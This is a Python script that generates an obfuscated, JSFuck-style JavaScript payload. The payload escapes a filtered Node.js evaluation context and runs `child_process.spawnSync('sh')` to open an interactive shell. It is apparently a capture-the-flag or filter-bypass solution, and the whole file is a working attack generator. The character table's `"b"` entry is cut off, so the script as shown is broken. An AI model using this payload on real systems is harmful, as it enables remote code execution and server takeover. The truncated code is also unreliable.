chars = {
    "a": "[![]+[]][+[]][+!![]]",
    "b
    "c": "[[][[![]+[]][+[]][+[]]+[![]+[]][+[]][!![]+!![]]+[![]+[]][+[]][+!![]]+[!![]+[]][+[]][+[]]]+[]][+[]][!![]+!![]+!![]]",
    "d": "[[][[]]+[]][+[]][!![]+!![]]",
    "e": "[!![]+[]][+[]][!![]+!![]+!![]]",
    "f": "[![]+[]][+[]][+[]]",
    "i": "[[![]]+[][[]]][+[]][+!![]+[]+[+[]][+[]]]",
    "l": "[![]+[]][+[]][!![]+!![]]",
    "n": "[[][[]]+[]][+[]][+!![]]",
    "o": "[!![]+[][[![]+[]][+[]][+[]]+[![]+[]][+[]][!![]+!![]]+[![]+[]][+[]][+!![]]+[!![]+[]][+[]][+[]]]][+[]][+!![]+[]+[+[]][+[]]]",
    "r": "[!![]+[]][+[]][+!![]]",
    "s": "[![]+[]][+[]][!![]+!![]+!![]]",
    "t": "[!![]+[]][+[]][+[]]",
    "u": "[!![]+[]][+[]][!![]+!![]]",
    ".": "[+[+!![]+[+!![]]+[!![]+[]][+[]][!![]+!![]+!![]]+[!![]+!![]]+[+!![]]]+[]][+[]][+!![]]",
    "+": "[+[+!![]+[+!![]]+[!![]+[]][+[]][!![]+!![]+!![]]+[!![]+!![]]+[+!![]]]+[]][+[]][!![]+!![]+!![]+!![]]",
    " ": "[[][[![]+[]][+[]][+[]]+[![]+[]][+[]][!![]+!![]]+[![]+[]][+[]][+!![]]+[!![]+[]][+[]][+[]]]+[]][+[]][!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]]",
    "(": "[[][[![]+[]][+[]][+[]]+[![]+[]][+[]][!![]+!![]]+[![]+[]][+[]][+!![]]+[!![]+[]][+[]][+[]]]+[]][+[]][+!![]+[]+[!![]+!![]+!![]]]",
    ")": "[[][[![]+[]][+[]][+[]]+[![]+[]][+[]][!![]+!![]]+[![]+[]][+[]][+!![]]+[!![]+[]][+[]][+[]]]+[]][+[]][+!![]+[]+[!![]+!![]+!![]+!![]]]",
    "{": "[[][[![]+[]][+[]][+[]]+[![]+[]][+[]][!![]+!![]]+[![]+[]][+[]][+!![]]+[!![]+[]][+[]][+[]]]+[]][+[]][+!![]+[]+[!![]+!![]+!![]+!![]+!![]+!![]]]",
    "[": "[[][[![]+[]][+[]][+[]]+[![]+[]][+[]][!![]+!![]]+[![]+[]][+[]][+!![]]+[!![]+[]][+[]][+[]]]+[]][+[]][+!![]+[]+[!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]]]",
    "v": "[[][[![]+[]][+[]][+[]]+[![]+[]][+[]][!![]+!![]]+[![]+[]][+[]][+!![]]+[!![]+[]][+[]][+[]]]+[]][+[]][[!![]+!![]]+[]+[!![]+!![]+!![]]]",
    "]": "[[][[![]+[]][+[]][+[]]+[![]+[]][+[]][!![]+!![]]+[![]+[]][+[]][+!![]]+[!![]+[]][+[]][+[]]]+[]][+[]][!![]+!![]+!![]+[+[]]]",
    "}": "[[][[![]+[]][+[]][+[]]+[![]+[]][+[]][!![]+!![]]+[![]+[]][+[]][+!![]]+[!![]+[]][+[]][+[]]]+[]][+[]][!![]+!![]+!![]+[+!![]+!![]]]",
    "0": "[+[]+[]][+[]]",
    "1": "[+!![]+[]][+[]]",
    "2": "[!![]+!![]+[]][+[]]",
    "3": "[!+[]+!+[]+!+[]+[]][+[]]",
    "4": "[!+[]+!+[]+!+[]+!+[]+[]][+[]]",
    "5": "[!+[]+!+[]+!+[]+!+[]+!+[]+[]][+[]]",
    "6": "[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[]][+[]]",
    "7": "[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[]][+[]]",
    "8": "[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[]][+[]]",
    "9": "[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[]][+[]]"
}


def ms(s: str):
    total = []
    for c in s:
        assert c in chars, c + ' not found'
        total.append(chars[c])
    return "+".join(total)


inner_chars_map = {
    "a": "(btoa+[])[12]",
    "b": "(btoa+[])[9]",
    "c": "(btoa+[])[3]",
    "d": "(btoa+[])[85]",
    "e": "(btoa+[])[30]",
    "f": "(btoa+[])[0]",
    "g": "(btoa+[])[141]",
    "h": "(btoa+[])[29]",
    "i": "(btoa+[])[5]",
    "j": "(btoa+[])[156]",
    "l": "(btoa+[])[35]",
    "m": "(btoa+[])[33]",
    "n": "(btoa+[])[2]",
    "o": "(btoa+[])[6]",
    "p": "(btoa+[])[16]",
    "q": "btoa([]+console+console+console)[47]",
    "r": "(btoa+[])[49]",
    "s": "(btoa+[])[54]",
    "t": "(btoa+[])[4]",
    "u": "(btoa+[])[1]",
    "v": "(btoa+[])[411]",
    "w": "(btoa+[])[94]",
    "x": "(btoa+[])[374]",
    "y": "(btoa+[])[92]",
    "z": "(btoa+[])[83]",
    "(": "(btoa+[])[13]",
    ")": "(btoa+[])[19]",
    ".": "(btoa+[])[120]",
    "_": "(btoa+[])[247]",
    "'": "([]+btoa)[261]",
    "M": "btoa(btoa)[174]",
    "S": "btoa(btoa)[17]",
    ":": "atob((btoa+[])[396]+(btoa+[])[141])",
    "{": "atob((btoa+[])[30]+(btoa+[])[94])",
    "}": "atob((btoa+[])[0]+btoa(btoa)[78])",
    ",": "atob(btoa(btoa)[140]+btoa(btoa)[138])",
    "[": "(btoa+[])[353]",
    "]": "(btoa+[])[355]"
}


inner_chars = [inner_chars_map[c] for c in "process.mainModule.require('child_process').spawnSync('sh',[],{'stdio':'inherit'})"]


def main():
    print(f'[][{ms("flat")}][{ms("constructor")}]({ms("eval(" + "+".join(inner_chars) + ")")})()')


if __name__ == '__main__':
    main()

